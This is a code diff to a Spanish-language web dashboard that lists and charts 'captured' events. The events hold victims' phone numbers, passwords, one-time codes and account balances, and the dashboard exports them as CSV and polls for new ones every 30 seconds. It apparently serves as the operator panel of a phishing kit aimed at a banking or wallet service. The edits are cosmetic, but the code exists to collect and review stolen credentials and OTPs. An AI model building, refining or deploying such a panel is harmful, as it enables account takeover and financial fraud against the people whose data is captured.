@@ -623,10 +623,10 @@
                 container.innerHTML = `
                     <div class="empty-state">
                         <svg viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                            <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/>
                         </svg>
-                        <h3>No hay eventos registrados</h3>
-                        <p>Los eventos aparecerán aquí cuando sean capturados</p>
+                        <h3>No hay eventos para mostrar</h3>
+                        <p>Intenta ajustar los filtros o espera a que lleguen nuevos eventos.</p>
                     </div>
                 `;
                 return;
@@ -641,24 +641,24 @@
                             <th>Contraseña</th>
                             <th>OTP</th>
                             <th>Saldo</th>
-                            <th>Fecha</th>
                             <th>Tipo</th>
+                            <th>Fecha</th>
                         </tr>
                     </thead>
                     <tbody>
                         ${events.map(event => `
                             <tr>
                                 <td>${event.id}</td>
-                                <td>${event.phone || '-'}</td>
-                                <td>${event.password ? 'SI' : 'NO'}</td>
-                                <td>${event.otp || '-'}</td>
-                                <td>${event.saldo || '-'}</td>
-                                <td>${new Date(event.created_at).toLocaleString('es-ES')}</td>
+                                <td>${event.phone || 'N/A'}</td>
+                                <td>${event.password ? '✓' : '✗'}</td>
+                                <td>${event.otp || 'N/A'}</td>
+                                <td>${event.saldo ? '$' + event.saldo : 'N/A'}</td>
                                 <td>
-                                    <span class="event-type ${event.password ? 'login' : event.otp ? 'otp' : 'other'}">
-                                        ${event.password ? 'Login' : event.otp ? 'OTP' : 'Otro'}
+                                    <span class="event-type ${getEventType(event)}">
+                                        ${getEventType(event)}
                                     </span>
                                 </td>
+                                <td>${new Date(event.created_at).toLocaleString('es-ES')}</td>
                             </tr>
                         `).join('')}
                     </tbody>
@@ -668,25 +668,30 @@
             container.innerHTML = tableHTML;
         }
 
+        // Get event type
+        function getEventType(event) {
+            if (event.password) return 'login';
+            if (event.otp) return 'otp';
+            return 'other';
+        }
+
         // Update charts
         function updateCharts(events) {
             updateDailyChart(events);
             updateTypeChart(events);
         }
 
-        // Update daily events chart
+        // Update daily chart
         function updateDailyChart(events) {
             const dailyData = {};
+            
             events.forEach(event => {
                 const date = new Date(event.created_at).toLocaleDateString('es-ES');
                 dailyData[date] = (dailyData[date] || 0) + 1;
             });
 
-            const sortedDates = Object.keys(dailyData).sort((a, b) => {
-                const dateA = new Date(a.split('/').reverse().join('-'));
-                const dateB = new Date(b.split('/').reverse().join('-'));
-                return dateA - dateB;
-            });
+            const labels = Object.keys(dailyData).sort((a, b) => new Date(a) - new Date(b));
+            const data = labels.map(label => dailyData[label]);
 
             const ctx = document.getElementById('dailyChart').getContext('2d');
             
@@ -697,14 +702,15 @@
             dailyChart = new Chart(ctx, {
                 type: 'line',
                 data: {
-                    labels: sortedDates,
+                    labels: labels,
                     datasets: [{
                         label: 'Eventos por día',
-                        data: sortedDates.map(date => dailyData[date]),
+                        data: data,
                         borderColor: '#DA0081',
                         backgroundColor: 'rgba(218, 0, 129, 0.1)',
-                        tension: 0.4,
-                        fill: true
+                        borderWidth: 3,
+                        fill: true,
+                        tension: 0.4
                     }]
                 },
                 options: {
@@ -718,8 +724,13 @@
                     scales: {
                         y: {
                             beginAtZero: true,
-                            ticks: {
-                                stepSize: 1
+                            grid: {
+                                color: 'rgba(0,0,0,0.1)'
+                            }
+                        },
+                        x: {
+                            grid: {
+                                display: false
                             }
                         }
                     }
@@ -727,13 +738,18 @@
             });
         }
 
-        // Update event type distribution chart
+        // Update type chart
         function updateTypeChart(events) {
             const typeData = {
-                'Login': events.filter(e => e.password).length,
-                'OTP': events.filter(e => e.otp).length,
-                'Otros': events.filter(e => !e.password && !e.otp).length
+                login: 0,
+                otp: 0,
+                other: 0
             };
+
+            events.forEach(event => {
+                const type = getEventType(event);
+                typeData[type]++;
+            });
 
             const ctx = document.getElementById('typeChart').getContext('2d');
             
@@ -744,10 +760,10 @@
             typeChart = new Chart(ctx, {
                 type: 'doughnut',
                 data: {
-                    labels: Object.keys(typeData),
+                    labels: ['Login', 'OTP', 'Otros'],
                     datasets: [{
-                        data: Object.values(typeData),
-                        backgroundColor: ['#DA0081', '#7b1fa2', '#388e3c'],
+                        data: [typeData.login, typeData.otp, typeData.other],
+                        backgroundColor: ['#DA0081', '#200020', '#9c27b0'],
                         borderWidth: 0
                     }]
                 },
@@ -756,7 +772,11 @@
                     maintainAspectRatio: false,
                     plugins: {
                         legend: {
-                            position: 'bottom'
+                            position: 'bottom',
+                            labels: {
+                                padding: 20,
+                                usePointStyle: true
+                            }
                         }
                     }
                 }
@@ -771,6 +791,7 @@
             }
 
             let csvContent = 'ID,Teléfono,Contraseña,OTP,Saldo,Fecha\n';
+            
             filteredEvents.forEach(event => {
                 csvContent += [
                     event.id,
@@ -797,6 +818,9 @@
         function refreshData() {
             loadEvents();
         }
+
+        // Real-time updates
+        setInterval(loadEvents, 30000);
     </script>
 </body>
 </html>
